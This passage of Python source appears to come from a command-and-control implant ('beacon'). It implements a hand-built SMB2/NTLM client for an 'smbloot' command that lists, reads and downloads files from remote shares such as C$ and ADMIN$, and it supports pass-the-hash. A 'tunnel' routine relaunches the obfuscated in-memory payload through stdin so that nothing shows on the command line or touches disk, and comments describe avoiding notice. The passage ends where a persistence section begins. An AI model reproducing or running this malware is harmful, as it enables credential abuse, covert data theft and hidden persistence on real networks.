        struct.pack_into("<H", tc, 4, 72)    # PathOffset (64+8)
        struct.pack_into("<H", tc, 6, len(path_enc))
        self._smb2_send(sock, 0x0003, msg_id, 0, bytes(tc) + path_enc,
                        session_id=session_id)
        resp = self._smb2_recv(sock)
        status = struct.unpack_from("<I", resp, 8)[0]
        if status != 0:
            raise PermissionError(f"TreeConnect failed: 0x{status:08x} ({share_path})")
        tree_id = struct.unpack_from("<I", resp, 36)[0]
        return tree_id, msg_id + 1

    def _smb2_create(self, sock: socket.socket, session_id: int,
                     tree_id: int, msg_id: int, path: str,
                     desired_access: int = 0x80000000,
                     disposition: int = 1,
                     options: int = 0) -> tuple:
        """SMB2 Create (open file/dir). Returns (file_id_bytes, next_msg_id)."""
        name_enc = path.encode("utf-16-le") if path else b""
        cr = bytearray(56)
        struct.pack_into("<H", cr, 0, 57)           # StructureSize
        struct.pack_into("<B", cr, 2, 0)            # SecurityFlags
        struct.pack_into("<B", cr, 3, 0)            # RequestedOplockLevel
        struct.pack_into("<I", cr, 4, disposition)  # ImpersonationLevel=Impersonation
        struct.pack_into("<Q", cr, 8, 0)            # SmbCreateFlags
        struct.pack_into("<Q", cr, 16, 0)           # Reserved
        struct.pack_into("<I", cr, 24, desired_access)
        struct.pack_into("<I", cr, 28, 0x07)        # FileAttributes (normal)
        struct.pack_into("<I", cr, 32, 0x07)        # ShareAccess (R|W|D)
        struct.pack_into("<I", cr, 36, disposition)
        struct.pack_into("<I", cr, 40, options)
        struct.pack_into("<H", cr, 44, 120)         # NameOffset (64+56)
        struct.pack_into("<H", cr, 46, len(name_enc))
        struct.pack_into("<I", cr, 48, 0)           # CreateContextsOffset
        struct.pack_into("<I", cr, 52, 0)           # CreateContextsLength
        payload = bytes(cr) + (name_enc if name_enc else b"\x00\x00")
        self._smb2_send(sock, 0x0005, msg_id, tree_id, payload,
                        session_id=session_id)
        resp = self._smb2_recv(sock)
        status = struct.unpack_from("<I", resp, 8)[0]
        if status != 0:
            raise FileNotFoundError(f"Create failed: 0x{status:08x} ({path})")
        file_id = resp[64 + 56:64 + 56 + 16]
        return file_id, msg_id + 1

    def _smb2_query_directory(self, sock: socket.socket, session_id: int,
                              tree_id: int, msg_id: int,
                              file_id: bytes, pattern: str = "*") -> tuple:
        """SMB2 QueryDirectory (FileBothDirectoryInformation). Returns (entries, next_msg_id)."""
        pat_enc = pattern.encode("utf-16-le")
        qd = bytearray(32)
        struct.pack_into("<H", qd, 0, 33)          # StructureSize
        struct.pack_into("<B", qd, 2, 0x03)        # FileInfoClass: FileBothDirectoryInformation
        struct.pack_into("<B", qd, 3, 0)            # Flags
        struct.pack_into("<I", qd, 4, 0)            # FileIndex
        qd[8:24] = file_id
        struct.pack_into("<H", qd, 24, 96)          # FileNameOffset (64+32)
        struct.pack_into("<H", qd, 26, len(pat_enc))
        struct.pack_into("<I", qd, 28, 65536)       # OutputBufferLength

        entries = []
        first = True
        while True:
            if not first:
                struct.pack_into("<B", qd, 3, 0)
            self._smb2_send(sock, 0x000e, msg_id, tree_id,
                            bytes(qd) + pat_enc, session_id=session_id)
            resp = self._smb2_recv(sock)
            msg_id += 1
            status = struct.unpack_from("<I", resp, 8)[0]
            if status == 0x80000006:  # STATUS_NO_MORE_FILES
                break
            if status != 0:
                break
            out_offset = struct.unpack_from("<H", resp, 64 + 2)[0]
            out_length = struct.unpack_from("<I", resp, 64 + 4)[0]
            data = resp[out_offset:out_offset + out_length]
            entries.extend(self._parse_dir_info(data))
            first = False
            # Continue with next batch
            struct.pack_into("<B", qd, 3, 0)  # no restart
        return entries, msg_id

    @staticmethod
    def _parse_dir_info(data: bytes) -> list:
        """Parse FileBothDirectoryInformation buffer."""
        entries = []
        offset = 0
        while offset < len(data):
            if offset + 94 > len(data):
                break
            next_entry = struct.unpack_from("<I", data, offset)[0]
            file_name_length = struct.unpack_from("<I", data, offset + 60)[0]
            file_attrs = struct.unpack_from("<I", data, offset + 56)[0]
            file_size = struct.unpack_from("<Q", data, offset + 40)[0]
            name_offset = offset + 104  # FileBothDirectoryInformation name is at +104
            if name_offset + file_name_length > len(data):
                break
            name = data[name_offset:name_offset + file_name_length].decode(
                "utf-16-le", errors="replace")
            if name not in (".", ".."):
                entries.append({
                    "name": name,
                    "size": file_size,
                    "is_dir": bool(file_attrs & 0x10),
                    "attrs": file_attrs,
                })
            if next_entry == 0:
                break
            offset += next_entry
        return entries

    def _smb2_read(self, sock: socket.socket, session_id: int,
                   tree_id: int, msg_id: int, file_id: bytes,
                   offset: int = 0, length: int = 65536) -> tuple:
        """SMB2 Read. Returns (data, next_msg_id)."""
        rd = bytearray(48)
        struct.pack_into("<H", rd, 0, 49)          # StructureSize
        struct.pack_into("<B", rd, 2, 0)           # Padding
        struct.pack_into("<B", rd, 3, 0)           # Flags
        struct.pack_into("<I", rd, 4, length)      # Length
        struct.pack_into("<Q", rd, 8, offset)      # Offset
        rd[16:32] = file_id
        struct.pack_into("<I", rd, 32, 1)          # MinimumCount
        struct.pack_into("<I", rd, 36, 0)          # Channel
        struct.pack_into("<I", rd, 40, 0)          # RemainingBytes
        struct.pack_into("<H", rd, 44, 0)          # ReadChannelInfoOffset
        struct.pack_into("<H", rd, 46, 0)          # ReadChannelInfoLength
        self._smb2_send(sock, 0x0008, msg_id, tree_id, bytes(rd),
                        session_id=session_id)
        resp = self._smb2_recv(sock)
        status = struct.unpack_from("<I", resp, 8)[0]
        if status == 0xc0000011:  # STATUS_END_OF_FILE
            return b"", msg_id + 1
        if status != 0:
            raise IOError(f"Read failed: 0x{status:08x}")
        data_offset = struct.unpack_from("<B", resp, 64 + 2)[0]
        data_length = struct.unpack_from("<I", resp, 64 + 4)[0]
        file_data = resp[data_offset:data_offset + data_length]
        return file_data, msg_id + 1

    def _smb2_close(self, sock: socket.socket, session_id: int,
                    tree_id: int, msg_id: int, file_id: bytes) -> int:
        """SMB2 Close file handle."""
        cl = bytearray(24)
        struct.pack_into("<H", cl, 0, 24)
        struct.pack_into("<H", cl, 2, 0)     # Flags
        struct.pack_into("<I", cl, 4, 0)     # Reserved
        cl[8:24] = file_id
        self._smb2_send(sock, 0x0006, msg_id, tree_id, bytes(cl),
                        session_id=session_id)
        self._smb2_recv(sock)
        return msg_id + 1

    def _smb2_tree_disconnect(self, sock: socket.socket, session_id: int,
                              tree_id: int, msg_id: int) -> int:
        """SMB2 TreeDisconnect."""
        td = struct.pack("<HH", 4, 0)
        self._smb2_send(sock, 0x0004, msg_id, tree_id, td,
                        session_id=session_id)
        self._smb2_recv(sock)
        return msg_id + 1

    def _exec_smbloot(self, args: str) -> str:
        """
        SMBLoot command — browse/download from SMB shares without loading extra packages.
        Usage:
            smbloot <server> <user> <pass_or_hash> [domain] [action] [path]
        Actions:
            shares               — list available shares
            ls <share> [path]    — list directory
            cat <share> <path>   — read file content (text preview)
            get <share> <path>   — download file (base64)
            tree <share> [path]  — recursive directory listing
        Hash format: aad3b435b51404eeaad3b435b51404ee:ntlmhash (pass-the-hash)
        """
        try:
            parts = args.strip().split()
            if len(parts) < 3:
                return ("Usage: smbloot <server> <user> <pass_or_hash> "
                        "[domain] [action] [path]\n"
                        "Actions: shares, ls, cat, get, tree\n"
                        "Hash format: LM:NT (pass-the-hash)")

            server = parts[0]
            username = parts[1]
            cred = parts[2]
            domain = parts[3] if len(parts) > 3 and parts[3] not in (
                "shares", "ls", "cat", "get", "tree") else "."
            action_idx = 3 if domain == "." else 4
            action = parts[action_idx] if len(parts) > action_idx else "shares"
            remaining = parts[action_idx + 1:] if len(parts) > action_idx + 1 else []

            # Determine password vs NT hash
            nt_hash = None
            password = cred
            if re.match(r'^[0-9a-fA-F]{32}:[0-9a-fA-F]{32}$', cred):
                nt_hash = bytes.fromhex(cred.split(":")[1])
                password = ""
            elif re.match(r'^[0-9a-fA-F]{32}$', cred):
                nt_hash = bytes.fromhex(cred)
                password = ""

            port = 445
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((server, port))

            try:
                # Negotiate
                self._smb2_negotiate(sock)
                # Authenticate
                session_id, _ = self._ntlm_auth(sock, username, password, domain, nt_hash)
                msg_id = 3

                if action == "shares":
                    return self._smbloot_list_shares(sock, session_id, msg_id, server)
                elif action == "ls":
                    share = remaining[0] if remaining else "C$"
                    path = remaining[1] if len(remaining) > 1 else ""
                    return self._smbloot_ls(sock, session_id, msg_id, server, share, path)
                elif action == "cat":
                    if len(remaining) < 2:
                        return "Usage: smbloot ... cat <share> <path>"
                    share, fpath = remaining[0], remaining[1]
                    return self._smbloot_cat(sock, session_id, msg_id, server, share, fpath)
                elif action == "get":
                    if len(remaining) < 2:
                        return "Usage: smbloot ... get <share> <path>"
                    share, fpath = remaining[0], remaining[1]
                    return self._smbloot_get(sock, session_id, msg_id, server, share, fpath)
                elif action == "tree":
                    share = remaining[0] if remaining else "C$"
                    path = remaining[1] if len(remaining) > 1 else ""
                    return self._smbloot_tree(sock, session_id, msg_id, server, share, path)
                else:
                    return f"Unknown action: {action}\nAvailable: shares, ls, cat, get, tree"
            finally:
                sock.close()

        except PermissionError as e:
            return f"[auth error] {e}"
        except ConnectionError as e:
            return f"[connection error] {e}"
        except Exception as e:
            return f"[smbloot error] {e}"

    def _smbloot_list_shares(self, sock, session_id, msg_id, server) -> str:
        """List shares via IPC$ + SRVSVC (NetShareEnumAll)."""
        share_path = f"\\\\{server}\\IPC$"
        tree_id, msg_id = self._smb2_tree_connect(sock, session_id, msg_id, share_path)
        # Open srvsvc named pipe
        try:
            file_id, msg_id = self._smb2_create(
                sock, session_id, tree_id, msg_id, "srvsvc",
                desired_access=0x0012019f, disposition=1, options=0x00000040)
            # Bind to SRVSVC
            bind_pkt = self._dcerpc_bind(
                b"\xc8\x4f\x32\x4b\x70\x16\xd3\x01\x12\x78\x5a\x47\xbf\x6e\xe1\x88",
                3, 0)
            msg_id = self._smb2_write(sock, session_id, tree_id, msg_id, file_id, bind_pkt)
            bind_resp, msg_id = self._smb2_read(sock, session_id, tree_id, msg_id, file_id)
            # NetShareEnumAll RPC call
            rpc_req = self._build_netshareenumall(server)
            msg_id = self._smb2_write(sock, session_id, tree_id, msg_id, file_id, rpc_req)
            rpc_resp, msg_id = self._smb2_read(sock, session_id, tree_id, msg_id, file_id,
                                               length=65536)
            shares = self._parse_netshareenumall(rpc_resp)
            msg_id = self._smb2_close(sock, session_id, tree_id, msg_id, file_id)
        except Exception as e:
            shares = [f"(SRVSVC failed: {e} — trying fallback)"]
            # Fallback: try connecting to well-known shares
            shares = []
            for sn in ["C$", "ADMIN$", "IPC$", "NETLOGON", "SYSVOL", "Users", "Shares"]:
                try:
                    tp = f"\\\\{server}\\{sn}"
                    tid, _ = self._smb2_tree_connect(sock, session_id, msg_id, tp)
                    shares.append({"name": sn, "type": 0, "comment": ""})
                    self._smb2_tree_disconnect(sock, session_id, tid, msg_id + 1)
                except Exception:
                    pass

        self._smb2_tree_disconnect(sock, session_id, tree_id, msg_id)

        if not shares:
            return "No shares found"
        if isinstance(shares[0], str):
            return "\n".join(shares)
        lines = [f"{'Share':<20} {'Type':<10} {'Comment'}",
                 "-" * 50]
        type_map = {0: "Disk", 1: "Print", 2: "Device", 3: "IPC",
                    0x80000000: "Disk$", 0x80000003: "IPC$"}
        for s in shares:
            t = type_map.get(s.get("type", 0), "Unknown")
            lines.append(f"{s['name']:<20} {t:<10} {s.get('comment', '')}")
        return "\n".join(lines)

    def _smbloot_ls(self, sock, session_id, msg_id, server, share, path) -> str:
        """List directory contents on a share."""
        share_path = f"\\\\{server}\\{share}"
        tree_id, msg_id = self._smb2_tree_connect(sock, session_id, msg_id, share_path)
        dir_path = path.replace("/", "\\").strip("\\") if path else ""
        file_id, msg_id = self._smb2_create(
            sock, session_id, tree_id, msg_id, dir_path,
            desired_access=0x00100081, disposition=1,
            options=0x00200021)  # FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT
        entries, msg_id = self._smb2_query_directory(
            sock, session_id, tree_id, msg_id, file_id)
        msg_id = self._smb2_close(sock, session_id, tree_id, msg_id, file_id)
        self._smb2_tree_disconnect(sock, session_id, tree_id, msg_id)

        if not entries:
            return f"(empty) \\\\{server}\\{share}\\{dir_path}"
        lines = [f"\\\\{server}\\{share}\\{dir_path}",
                 f"{'Name':<40} {'Size':<12} {'Type'}",
                 "-" * 60]
        for e in sorted(entries, key=lambda x: (not x["is_dir"], x["name"].lower())):
            t = "DIR" if e["is_dir"] else "FILE"
            sz = "" if e["is_dir"] else str(e["size"])
            lines.append(f"{e['name']:<40} {sz:<12} {t}")
        lines.append(f"\n{len(entries)} entries")
        return "\n".join(lines)

    def _smbloot_cat(self, sock, session_id, msg_id, server, share, fpath) -> str:
        """Read and display file content (text preview, max 64KB)."""
        share_path = f"\\\\{server}\\{share}"
        tree_id, msg_id = self._smb2_tree_connect(sock, session_id, msg_id, share_path)
        file_path = fpath.replace("/", "\\").strip("\\")
        file_id, msg_id = self._smb2_create(
            sock, session_id, tree_id, msg_id, file_path,
            desired_access=0x80000000, disposition=1, options=0)
        data = b""
        offset = 0
        while len(data) < 65536:
            chunk, msg_id = self._smb2_read(
                sock, session_id, tree_id, msg_id, file_id,
                offset=offset, length=65536)
            if not chunk:
                break
            data += chunk
            offset += len(chunk)
        msg_id = self._smb2_close(sock, session_id, tree_id, msg_id, file_id)
        self._smb2_tree_disconnect(sock, session_id, tree_id, msg_id)
        return data.decode("utf-8", errors="replace")[:65536]

    def _smbloot_get(self, sock, session_id, msg_id, server, share, fpath) -> str:
        """Download file as base64 (JSON result with filename, size, data)."""
        share_path = f"\\\\{server}\\{share}"
        tree_id, msg_id = self._smb2_tree_connect(sock, session_id, msg_id, share_path)
        file_path = fpath.replace("/", "\\").strip("\\")
        file_id, msg_id = self._smb2_create(
            sock, session_id, tree_id, msg_id, file_path,
            desired_access=0x80000000, disposition=1, options=0)
        data = b""
        offset = 0
        max_size = 10 * 1024 * 1024
        while len(data) < max_size:
            chunk, msg_id = self._smb2_read(
                sock, session_id, tree_id, msg_id, file_id,
                offset=offset, length=65536)
            if not chunk:
                break
            data += chunk
            offset += len(chunk)
        msg_id = self._smb2_close(sock, session_id, tree_id, msg_id, file_id)
        self._smb2_tree_disconnect(sock, session_id, tree_id, msg_id)
        filename = fpath.replace("\\", "/").rsplit("/", 1)[-1]
        return json.dumps({
            "filename": filename,
            "size": len(data),
            "data": base64.b64encode(data).decode(),
        })

    def _smbloot_tree(self, sock, session_id, msg_id, server, share, path,
                      depth: int = 0, max_depth: int = 3) -> str:
        """Recursive directory listing."""
        share_path = f"\\\\{server}\\{share}"
        tree_id, msg_id = self._smb2_tree_connect(sock, session_id, msg_id, share_path)
        lines = []
        self._smbloot_tree_recurse(sock, session_id, tree_id, msg_id,
                                   path.replace("/", "\\").strip("\\"),
                                   lines, 0, max_depth)
        self._smb2_tree_disconnect(sock, session_id, tree_id, msg_id + 100)
        if not lines:
            return f"(empty) \\\\{server}\\{share}\\{path}"
        header = f"\\\\{server}\\{share}\\{path}\n"
        return header + "\n".join(lines[:2000])

    def _smbloot_tree_recurse(self, sock, session_id, tree_id, msg_id,
                              dir_path, lines, depth, max_depth):
        """Helper for recursive tree listing."""
        if depth > max_depth:
            return msg_id
        try:
            file_id, msg_id = self._smb2_create(
                sock, session_id, tree_id, msg_id, dir_path,
                desired_access=0x00100081, disposition=1,
                options=0x00200021)
            entries, msg_id = self._smb2_query_directory(
                sock, session_id, tree_id, msg_id, file_id)
            msg_id = self._smb2_close(sock, session_id, tree_id, msg_id, file_id)
        except Exception:
            return msg_id

        indent = "  " * depth
        for e in sorted(entries, key=lambda x: (not x["is_dir"], x["name"].lower())):
            if e["is_dir"]:
                lines.append(f"{indent}[DIR]  {e['name']}")
                sub = f"{dir_path}\\{e['name']}" if dir_path else e["name"]
                msg_id = self._smbloot_tree_recurse(
                    sock, session_id, tree_id, msg_id, sub, lines, depth + 1, max_depth)
            else:
                lines.append(f"{indent}       {e['name']} ({e['size']})")
            if len(lines) > 2000:
                lines.append(f"{indent}... (truncated)")
                return msg_id
        return msg_id

    def _smb2_write(self, sock: socket.socket, session_id: int,
                    tree_id: int, msg_id: int, file_id: bytes,
                    data: bytes, offset: int = 0) -> int:
        """SMB2 Write to a file/pipe."""
        wr = bytearray(48)
        struct.pack_into("<H", wr, 0, 49)          # StructureSize
        struct.pack_into("<H", wr, 2, 112)         # DataOffset (64+48)
        struct.pack_into("<I", wr, 4, len(data))   # Length
        struct.pack_into("<Q", wr, 8, offset)      # Offset
        wr[16:32] = file_id
        struct.pack_into("<I", wr, 32, 0)          # Channel
        struct.pack_into("<I", wr, 36, 0)          # RemainingBytes
        struct.pack_into("<H", wr, 40, 0)          # WriteChannelInfoOffset
        struct.pack_into("<H", wr, 42, 0)          # WriteChannelInfoLength
        struct.pack_into("<I", wr, 44, 0)          # Flags
        self._smb2_send(sock, 0x0009, msg_id, tree_id, bytes(wr) + data,
                        session_id=session_id)
        self._smb2_recv(sock)
        return msg_id + 1

    @staticmethod
    def _dcerpc_bind(uuid_bytes: bytes, ver_major: int, ver_minor: int) -> bytes:
        """Build a DCE/RPC Bind PDU for a given interface UUID."""
        iface = uuid_bytes + struct.pack("<HH", ver_major, ver_minor)
        ndr_uuid = (b"\x04\x5d\x88\x8a\xeb\x1c\xc9\x11"
                    b"\x9f\xe8\x08\x00\x2b\x10\x48\x60")
        transfer = ndr_uuid + struct.pack("<HH", 2, 0)
        ctx = struct.pack("<HBB", 0, 1, 0)  # context_id=0, num_transfer=1
        ctx += iface + transfer
        bind_body = struct.pack("<HHI", 4096, 4096, 0)  # max_xmit, max_recv, assoc_group
        bind_body += struct.pack("<B", 1) + b"\x00" * 3  # num_ctx + padding
        bind_body += ctx
        # RPC header
        hdr = struct.pack("<BBBBIHHI",
                          5,   # version
                          0,   # minor
                          11,  # BIND
                          0x03,  # PFC_FIRST_FRAG | PFC_LAST_FRAG
                          0x10000000,  # data representation
                          len(bind_body) + 16,  # frag_length
                          0,   # auth_length
                          0)   # call_id
        return hdr + bind_body

    def _build_netshareenumall(self, server: str) -> bytes:
        """Build NetShareEnumAll DCE/RPC request."""
        server_uni = (f"\\\\{server}\x00").encode("utf-16-le")
        # Align to 4 bytes
        pad = (4 - len(server_uni) % 4) % 4
        # NDR: MaxCount, Offset, ActualCount, string
        ndr_str = struct.pack("<III", len(server_uni) // 2,
                              0, len(server_uni) // 2) + server_uni + b"\x00" * pad
        # Level = 1
        level = struct.pack("<I", 1)
        # InfoStruct (level 1 container - simplified)
        info = struct.pack("<III", 1, 0, 0)  # level, switch, pointer
        # Pointer + ResumeHandle
        resume = struct.pack("<II", 0xffffffff, 0)  # PreferedMaxLength, ResumeHandle
        # Reference pointer for server name
        ref_id = struct.pack("<I", 0x00020000)

        stub = ref_id + ndr_str + level + info + resume

        # RPC Request header
        hdr = struct.pack("<BBBBIHHI",
                          5, 0,   # version
                          0,      # REQUEST
                          0x03,   # flags
                          0x10000000,
                          len(stub) + 24,  # frag_length
                          0,      # auth_length
                          1)      # call_id
        req_hdr = struct.pack("<IHH", len(stub), 0, 15)  # alloc_hint, ctx_id, opnum (NetShareEnumAll=15)
        return hdr + req_hdr + stub

    @staticmethod
    def _parse_netshareenumall(data: bytes) -> list:
        """Parse NetShareEnumAll DCE/RPC response (best-effort)."""
        shares = []
        # Find share names in the response by looking for Unicode strings
        # The response format: RPC header + NDR-encoded ShareInfo1 array
        idx = data.find(b"\x00" * 4, 24)  # skip RPC header
        # Simplified: extract null-terminated UTF-16 strings that look like share names
        i = 24  # skip DCE/RPC header
        while i < len(data) - 4:
            # Look for reference ID pattern followed by string data
            # Share names are typically short Unicode strings
            if i + 12 < len(data):
                max_count = struct.unpack_from("<I", data, i)[0]
                if 1 <= max_count <= 256:
                    offset_val = struct.unpack_from("<I", data, i + 4)[0]
                    actual = struct.unpack_from("<I", data, i + 8)[0]
                    if offset_val == 0 and actual == max_count and actual <= 128:
                        str_len = actual * 2
                        if i + 12 + str_len <= len(data):
                            try:
                                name = data[i + 12:i + 12 + str_len].decode(
                                    "utf-16-le").rstrip("\x00")
                                if name and name.isprintable() and len(name) < 64:
                                    if not any(s["name"] == name for s in shares):
                                        shares.append({"name": name, "type": 0, "comment": ""})
                            except Exception:
                                pass
            i += 4
        return shares

    # ── The tunnel child ──

    def _tunnel_source(self) -> Tuple[bytes, str]:
        """The source to hand a child, and where it was taken from.

        A generated artifact carries its own source in the module global
        `_src`, bound by each obfuscation layer as it decompresses the
        next (`_obfuscate_layer` in server.py). That global is the only
        copy there is: what this project ships is
        `python3 -c '<blob>'`, where there is no file to re-run and
        `sys.argv[0]` is the literal string "-c" -- which is also why
        `_get_beacon_path` answers with something useless in exactly the
        mode this runs in.

        No `_src` means this file was run straight from a checkout rather
        than built into an artifact, and then `__file__` is the source. A
        developer in that position should not be debugging a missing
        global, so it is a supported path and not an error.

        The second return value says which it was, and `_exec_tunnel`
        puts it in what it reports: "the tunnel is running a different
        build from the beacon" is otherwise invisible, and it is the first
        thing to suspect when a child connects and then behaves like
        another version.
        """
        src = globals().get("_src")
        if isinstance(src, str):
            # A layer that bound text rather than bytes. Accepted because
            # the alternative is refusing to start over an encoding.
            src = src.encode("utf-8")
        if isinstance(src, bytes) and src:
            return src, "_src, this artifact's own source (%d bytes)" % len(src)
        path = globals().get("__file__")
        if not path:
            raise RuntimeError(
                "this process has neither the module global _src nor a "
                "__file__, so there is no copy of the source to give a "
                "child. A generated artifact has _src; a checkout has a "
                "file.")
        path = os.path.abspath(path)
        data = Path(path).read_bytes()
        return data, ("%s (no _src: this is a checkout and not a generated "
                      "artifact, %d bytes)" % (path, len(data)))

    def _tunnel_status(self) -> Optional[dict]:
        """What this beacon's tunnel child is doing, or None if it had none.

        `poll` is what reaps a child that has exited, so asking this on
        every check-in is also what keeps a dead one from staying a
        zombie.
        """
        with self._tunnel_lock:
            proc = self._tunnel_proc
            if proc is None:
                return None
            code = proc.poll()
            row = {
                "pid": proc.pid,
                "running": code is None,
                "source": self._tunnel_origin,
            }
            if code is not None:
                row["exit_code"] = code
            return row

    def _exec_tunnel(self, action: str) -> str:
        """Start or stop the tunnel endpoint as a child of this process."""
        action = (action or "").strip().lower()
        if action == "start":
            return self._tunnel_start()
        if action == "stop":
            return self._tunnel_stop()
        return ("[error] Unknown tunnel action %r: it is 'tunnel start' or "
                "'tunnel stop'" % action)

    def _tunnel_start(self) -> str:
        """Run this artifact again as `python3 -`, in tunnel mode.

        Four ways to start a second process of the same code exist and
        three are worse. Re-running `python3 -c '<blob>'` writes the whole
        payload into `ps` and `/proc/<pid>/cmdline`, which is how the
        infrastructure this derives from was mapped across providers.
        Writing the source to a file throws away the in-memory property
        the one-liner exists for. `fork` does not exist on Windows, where
        much of this design lives. `python3 -` with the source on stdin is
        an unremarkable command line, leaves nothing on disk, and is the
        same mechanism on both platforms.
        """
        with self._tunnel_lock:
            proc = self._tunnel_proc
            if proc is not None and proc.poll() is None:
                return ("Tunnel already running: pid %d (one child per "
                        "beacon; stop it before starting another)"
                        % proc.pid)
            # Refused here rather than by the child. The child's own
            # bootstrap refuses too -- a build can be launched by hand or
            # by a systemd unit with no parent -- but its stderr is
            # DEVNULL, so a child is the one way the operator cannot be
            # told why. The most likely case by far is a build generated
            # before the generator learned to bake a tunnel block, and
            # that currently reaches them as `exit_code: 1` and nothing
            # else. Same predicate as the bootstrap's, wrapped in the
            # config shape it reads.
            #
            # `_tunnel_problem` first, when there is one: the config file
            # had a tunnel block and it was refused, so the predicate
            # below would take its no-block arm and tell the operator to
            # generate a build, which is not what is wrong and not
            # something they can do about a YAML typo.
            problem = (self._tunnel_problem
                       or tunnel_mode_problem(
                           {"c2": {"tunnel": self._tunnel_cfg}}))
            if problem:
                return "[error] Not starting a tunnel child: %s" % problem
            try:
                source, origin = self._tunnel_source()
            except (OSError, RuntimeError) as exc:
                return "[error] No source to give a tunnel child: %s" % exc

            env = dict(os.environ)
            env[_TUNNEL_MODE_ENV] = "1"
            try:
                child = subprocess.Popen(
                    [sys.executable, "-"],
                    stdin=subprocess.PIPE,
                    # Both ends closed: a child that writes to the
                    # terminal it was started from is how an implant is
                    # noticed. What the endpoint could not do is reported
                    # through its exit code at the next check-in, and the
                    # tunnel server's own log is the other half.
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    env=env,
                    close_fds=True,
                )
            except OSError as exc:
                return ("[error] Could not start %s: %s"
                        % (sys.executable, exc))

            try:
                # On a thread with a bounded join, not inline. `python -`
                # reads stdin to EOF before it compiles anything, so this
                # is milliseconds -- but the pipe holds only about 64 KB,
                # and a child that reads nothing at all would park the
                # beacon's own thread in `write` for ever. See
                # `_TUNNEL_SOURCE_TIMEOUT`.
                failure = self._feed_tunnel_child(child, source)
            except RuntimeError as exc:
                # The host is out of threads, which is the one way the
                # feed can fail before it has begun. A child left running
                # with no record of it is a process nothing can stop, so
                # it goes the same way as one that read nothing.
                failure = "its source could not be written: %s" % exc
            if failure is not None:
                child.kill()
                return ("[error] The tunnel child was given no source and "
                        "has been killed: %s (%s)"
                        % (failure, self._child_ending(child)[1]))

            self._tunnel_proc = child
            self._tunnel_origin = origin
            logger.info("Tunnel child started: pid %d, source from %s",
                        child.pid, origin)
            return ("Tunnel started: pid %d, %s - with the source on "
                    "stdin, so none of it is on a command line. Source: %s"
                    % (child.pid, sys.executable, origin))

    @staticmethod
    def _feed_tunnel_child(child, source: bytes) -> Optional[str]:
        """Write the source to the child's stdin. Why it failed, or None.

        The write is on a thread so the wait on it can be bounded: a
        child that is not reading stdin would otherwise hold the caller
        in `write` as soon as the pipe filled, and the caller is the
        beacon's own loop.

        Killing the child is left to the caller, and it is what ends this
        thread when the bound is reached -- the parked `write` fails with
        EPIPE the moment the reader is gone, so the thread is not leaked.
        """
        trouble = []

        def feed():
            try:
                child.stdin.write(source)
            except OSError as exc:
                # A child that exited before it read -- a broken pipe --
                # or a stdin already closed under us.
                trouble.append("%s: %s" % (type(exc).__name__, exc))
            finally:
                try:
                    # Closed on every path, including the one the caller
                    # unparks by killing the child: a pipe left open is a
                    # descriptor leak in a process meant to run for
                    # months, and the EOF is what tells the interpreter
                    # the script is complete.
                    child.stdin.close()
                except OSError:
                    # The flush that `close` does finds the same broken
                    # pipe the write did. The descriptor is closed either
                    # way, which is what this is for.
                    pass

        writer = threading.Thread(target=feed, name="tunnel-feed",
                                  daemon=True)
        writer.start()
        writer.join(_TUNNEL_SOURCE_TIMEOUT)
        if writer.is_alive():
            return ("it read none of the %d bytes on its stdin within "
                    "%.0fs, so it is not an interpreter reading a script"
                    % (len(source), _TUNNEL_SOURCE_TIMEOUT))
        return trouble[0] if trouble else None

    @staticmethod
    def _child_ending(proc) -> Tuple[Optional[int], str]:
        """Wait for a signalled child: its exit code, and how to say it.

        Never raises, which is the point. `wait` raising
        `subprocess.TimeoutExpired` out of `_tunnel_start` would reach
        the operator as `[exception: ...]` from `_process_tasking`'s
        catch-all with no child recorded, and out of `_tunnel_stop` it
        would abort the rest of `Beacon.stop` before it had finished. A
        child that has been killed and is still there is stuck in the
        kernel and there is nothing further to try, so it is reported
        rather than raised -- and the residue it leaves is named, because
        "nothing is leaked" would not be true of it.
        """
        try:
            code = proc.wait(timeout=_TUNNEL_CHILD_STOP_TIMEOUT)
        except subprocess.TimeoutExpired:
            return None, ("pid %d has not gone within %.0fs, so it is stuck "
                          "in the kernel and unreaped"
                          % (proc.pid, _TUNNEL_CHILD_STOP_TIMEOUT))
        return code, "exit %s" % code

    def _tunnel_stop(self) -> str:
        """Stop the tunnel child. The record of it outlives it.

        Not cleared, because an operator's stop is pending until a
        check-in confirms it: a beacon that forgot the child would report
        nothing, which is indistinguishable from a stop that never
        happened.

        Both waits go through `_child_ending` and neither calls `wait`
        itself. A `subprocess.TimeoutExpired` out of here would abort the
        rest of `Beacon.stop` before it had finished, and reach an
        operator as `[exception: ...]` from the tasking catch-all.
        """
        with self._tunnel_lock:
            proc = self._tunnel_proc
            if proc is None:
                return ("No tunnel child is running: this beacon has not "
                        "started one")
            code = proc.poll()
            if code is not None:
                return ("No tunnel child is running: pid %d had already "
                        "exited with %s" % (proc.pid, code))
            proc.terminate()
            code, ending = self._child_ending(proc)
            if code is None:
                # It did not go when asked.
                proc.kill()
                code, ending = self._child_ending(proc)
                if code is None:
                    logger.warning("Tunnel child pid %d survived a kill",
                                   proc.pid)
                    return ("[error] The tunnel child could not be stopped: "
                            "it ignored a terminate and then a kill, and %s"
                            % ending)
                logger.warning("Tunnel child pid %d ignored a terminate and "
                               "was killed", proc.pid)
                return ("Tunnel stopped: pid %d ignored a terminate and was "
                        "killed (%s)" % (proc.pid, ending))
            logger.info("Tunnel child stopped: pid %d, exit %s", proc.pid, code)
            return "Tunnel stopped: pid %d, exit %s" % (proc.pid, code)

    # ── Persistence ──

    def _bundled_payload(self) -> str:
        """This build's payload beside this interpreter, or "".

        Non-empty means the interpreter running us is one we brought: the
        stager lays the payload out next to it and the startup hook in
        its own `Lib/` beside that. That is the only situation in which
        the hook exists, so it is the only situation in which the `argc`
        gate can be allowed to drop the payload's path from an autorun
        command line.
        """
        if not self._persist_payload:
            return ""
        candidate = os.path.join(
            os.path.dirname(os.path.abspath(sys.executable)),
            self._persist_payload)
        return candidate if os.path.isfile(candidate) else ""

    def _get_beacon_path(self) -> str:
        """The payload path an autorun entry should name, or "" for none.

        "" is a supported answer and means the entry needs no path: under
        the `argc` gate, with a payload beside an interpreter we brought,
        the hook in that interpreter's `Lib/` finds the payload itself and
        the command line carries nothing to find.

        Otherwise the bundled payload if there is one, and `sys.argv[0]`
        if there is not -- which is the one thing this project ships as
